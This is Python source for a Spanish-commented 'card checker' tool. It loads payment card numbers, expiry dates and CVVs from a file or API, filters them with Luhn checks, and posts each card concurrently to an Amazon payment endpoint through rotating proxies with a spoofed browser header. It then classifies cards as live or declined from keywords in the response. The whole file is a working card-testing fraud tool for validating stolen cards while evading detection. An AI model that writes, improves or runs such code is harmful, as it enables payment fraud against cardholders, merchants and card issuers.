import requests
import json
import time
import threading
import random
from typing import Dict, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from .algorithms import AdvancedAlgorithms
from .proxy_manager import ProxyManager
from .api_client import APIClient
from utils.logger import Logger
from utils.validators import CardValidator
from interfaces.monitor import Monitor

class CardChecker:
    """
    Sistema principal de verificación de tarjetas con gates específicos.
    Implementa algoritmos avanzados para maximizar el éxito de las verificaciones.
    """

    def __init__(self, config):
        self.config = config
        self.logger = Logger("CardChecker")
        self.algorithms = AdvancedAlgorithms()
        self.proxy_manager = ProxyManager(config)
        self.proxy_manager.set_algorithms(self.algorithms)
        self.api_client = APIClient(config)
        self.card_validator = CardValidator()
        self.monitor = None  # Se inyectará desde la UI
        self.is_running = False
        self.results = []
        self.results_lock = threading.Lock()

        # Gates de verificación
        self.gates = {
            "amazon": {
                "url": "https://www.amazon.com/gp/buy/spcc/handlers/display.html?hasWorkingJavascript=1",
                "method": "POST",
                "headers": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1"
                },
                "payload": {
                    "paymentMethod": "credit_card",
                    "x": "0",
                    "y": "0"
                },
                "success_indicators": ["Payment method", "Your credit card", "Thank you"],
                "failure_indicators": ["invalid", "declined", "error", "could not"]
            }
        }

    def set_monitor(self, monitor):
        """Inyecta la instancia del monitor"""
        self.monitor = monitor

    def initialize(self):
        """
        Inicializa el sistema de verificación.
        """
        self.logger.info("Inicializando sistema de verificación de tarjetas...")

        # Inicializar gestor de proxies
        if not self.proxy_manager.initialize():
            self.logger.error("No se pudo inicializar el gestor de proxies")
            return False

        self.logger.info("Sistema de verificación inicializado correctamente")
        return True

    def check_card_with_gate(self, card_data: Dict, gate_name: str) -> Dict:
        """
        Verifica una tarjeta con un gate específico.
        """
        gate = self.gates.get(gate_name)
        if not gate:
            return {
                "success": False,
                "message": f"Gate '{gate_name}' no configurado",
                "card": card_data,
                "gate": gate_name,
                "response_time": 0
            }

        # Obtener un proxy
        proxy = self.proxy_manager.get_proxy()
        if not proxy:
            return {
                "success": False,
                "message": "No hay proxies disponibles",
                "card": card_data,
                "gate": gate_name,
                "response_time": 0
            }

        # Preparar payload con datos de la tarjeta
        payload = gate["payload"].copy()
        payload.update({
            "cardNumber": card_data["number"],
            "expiryMonth": card_data["month"],
            "expiryYear": card_data["year"],
            "cvv": card_data["cvv"]
        })

        proxy_dict = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

        # Calcular timeout adaptativo
        timeout = self.algorithms.adaptive_timeout(proxy, self.config.TIMEOUT)

        try:
            start_time = time.time()

            # Realizar la solicitud
            if gate["method"] == "POST":
                response = requests.post(
                    gate["url"],
                    data=payload,
                    headers=gate["headers"],
                    proxies=proxy_dict,
                    timeout=timeout,
                    allow_redirects=True
                )
            else:
                response = requests.get(
                    gate["url"],
                    params=payload,
                    headers=gate["headers"],
                    proxies=proxy_dict,
                    timeout=timeout,
                    allow_redirects=True
                )

            response_time = time.time() - start_time

            # Analizar respuesta
            response_text = response.text.lower()

            # Verificar indicadores de éxito
            is_success = any(indicator.lower() in response_text for indicator in gate["success_indicators"])

            # Verificar indicadores de fallo
            is_failure = any(indicator.lower() in response_text for indicator in gate["failure_indicators"])

            # Determinar resultado
            if is_success and not is_failure:
                result = {
                    "success": True,
                    "message": "Tarjeta verificada con éxito",
                    "card": card_data,
                    "gate": gate_name,
                    "response_time": response_time,
                    "proxy": proxy
                }

                # Actualizar rendimiento del proxy
                self.algorithms.update_proxy_performance(proxy, True, response_time)

                return result
            else:
                result = {
                    "success": False,
                    "message": "Tarjeta rechazada",
                    "card": card_data,
                    "gate": gate_name,
                    "response_time": response_time,
                    "proxy": proxy
                }

                # Actualizar rendimiento del proxy
                self.algorithms.update_proxy_performance(proxy, False, response_time)

                # Si el proxy falló mucho, marcarlo como fallido
                if is_failure or response.status_code >= 400:
                    self.proxy_manager.mark_proxy_failed(proxy)

                return result

        except requests.exceptions.Timeout:
            self.algorithms.update_proxy_performance(proxy, False, timeout)
            self.proxy_manager.mark_proxy_failed(proxy)

            return {
                "success": False,
                "message": "Timeout al verificar tarjeta",
                "card": card_data,
                "gate": gate_name,
                "response_time": timeout,
                "proxy": proxy
            }

        except Exception as e:
            self.algorithms.update_proxy_performance(proxy, False, float('inf'))
            self.proxy_manager.mark_proxy_failed(proxy)

            return {
                "success": False,
                "message": f"Error: {str(e)}",
                "card": card_data,
                "gate": gate_name,
                "response_time": 0,
                "proxy": proxy
            }

    def check_card(self, card_data: Dict, gate_name: str = "amazon") -> Dict:
        """
        Verifica una tarjeta aplicando algoritmos avanzados.
        """
        # Validar formato de la tarjeta
        if not self.card_validator.validate(card_data):
            return {
                "success": False,
                "message": "Formato de tarjeta inválido",
                "card": card_data,
                "gate": gate_name,
                "response_time": 0
            }

        # Verificar con algoritmo de Luhn
        if not self.algorithms.luhn_algorithm(card_data["number"]):
            return {
                "success": False,
                "message": "Tarjeta inválida (Luhn)",
                "card": card_data,
                "gate": gate_name,
                "response_time": 0
            }

        # Calcular probabilidad de éxito
        success_probability = self.algorithms.calculate_check_probability(card_data)

        # Si la probabilidad es muy baja, podemos omitir la verificación
        if success_probability < 0.1:
            return {
                "success": False,
                "message": "Probabilidad de éxito muy baja",
                "card": card_data,
                "gate": gate_name,
                "response_time": 0
            }

        # Verificar con el gate
        result = self.check_card_with_gate(card_data, gate_name)
        result["probability"] = success_probability

        return result

    def check_cards(self, cards: List[Dict], gate_name: str = "amazon") -> List[Dict]:
        """
        Verifica una lista de tarjetas de forma optimizada.
        """
        # Optimizar orden de verificación
        optimized_cards = self.algorithms.optimize_check_sequence(cards)

        results = []

        with ThreadPoolExecutor(max_workers=self.config.CONCURRENT_CHECKS) as executor:
            # Enviar todas las tareas
            future_to_card = {
                executor.submit(self.check_card, card, gate_name): card
                for card in optimized_cards
            }

            # Recibir resultados a medida que completan
            for future in as_completed(future_to_card):
                card = future_to_card[future]
                try:
                    result = future.result()
                    results.append(result)

                    # Actualizar monitor si está disponible
                    if self.monitor:
                        self.monitor.add_result(result)

                except Exception as e:
                    self.logger.error(f"Error al verificar tarjeta {card.get('number', 'unknown')}: {str(e)}")
                    results.append({
                        "success": False,
                        "message": f"Error: {str(e)}",
                        "card": card,
                        "gate": gate_name,
                        "response_time": 0
                    })

        return results

    def check_cards_from_file(self, file_path: str, gate_name: str = "amazon") -> List[Dict]:
        """
        Verifica tarjetas desde un archivo.
        """
        from utils.file_handler import FileHandler

        file_handler = FileHandler()
        cards = file_handler.read_cards_from_file(file_path)

        if not cards:
            self.logger.error(f"No se pudieron cargar tarjetas desde {file_path}")
            return []

        self.logger.info(f"Verificando {len(cards)} tarjetas desde {file_path}")
        return self.check_cards(cards, gate_name)

    def check_cards_from_api(self, gate_name: str = "amazon") -> List[Dict]:
        """
        Verifica tarjetas desde la API.
        """
        cards = self.api_client.get_all_cards()

        if not cards:
            self.logger.error("No se pudieron obtener tarjetas desde la API")
            return []

        self.logger.info(f"Verificando {len(cards)} tarjetas desde la API")
        return self.check_cards(cards, gate_name)

    def check_single_card(self, card_data: Dict, gate_name: str = "amazon") -> Dict:
        """
        Verifica una sola tarjeta.
        """
        return self.check_card(card_data, gate_name)

    def get_stats(self) -> Dict:
        """
        Obtiene estadísticas de las verificaciones.
        """
        with self.results_lock:
            total = len(self.results)
            success = sum(1 for r in self.results if r["success"])
            failed = total - success

            if total == 0:
                return {
                    "total": 0,
                    "success": 0,
                    "failed": 0,
                    "success_rate": 0,
                    "avg_response_time": 0
                }

            success_rate = (success / total) * 100
            avg_response_time = sum(r["response_time"] for r in self.results) / total

            return {
                "total": total,
                "success": success,
                "failed": failed,
                "success_rate": success_rate,
                "avg_response_time": avg_response_time
            }

    def save_results(self, file_path: str = None):
        """
        Guarda los resultados en un archivo.
        """
        if file_path is None:
            file_path = self.config.RESULTS_FILE

        with self.results_lock:
            try:
                with open(file_path, 'w') as f:
                    json.dump(self.results, f, indent=2)

                self.logger.info(f"Resultados guardados en {file_path}")
                return True

            except Exception as e:
                self.logger.error(f"Error al guardar resultados: {str(e)}")
                return False